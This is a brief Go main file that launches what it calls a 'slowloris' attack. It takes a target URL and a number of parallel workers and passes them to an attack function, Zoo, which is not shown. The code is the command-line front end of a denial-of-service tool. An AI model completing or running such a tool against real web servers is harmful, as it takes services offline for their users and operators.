package main

import (
	"flag"
	"fmt"
)

func main() {
	var url *string = flag.String("url", "", "URL to perform attack")
	var count *int64 = flag.Int64("count", int64(10), "Number of parallel workers")

	flag.Parse()
	if !flag.Parsed() {
		Help()
		return
	}

	if *url == "" {
		Help()
		return
	}

	fmt.Println("slowloris...")
	fmt.Printf("url: %s, count: %d\n", *url, *count)
	if err := Zoo(Config{
		URL:   *url,
		Count: *count,
	}); err != nil {
		fmt.Println(err)
	}

	return
}
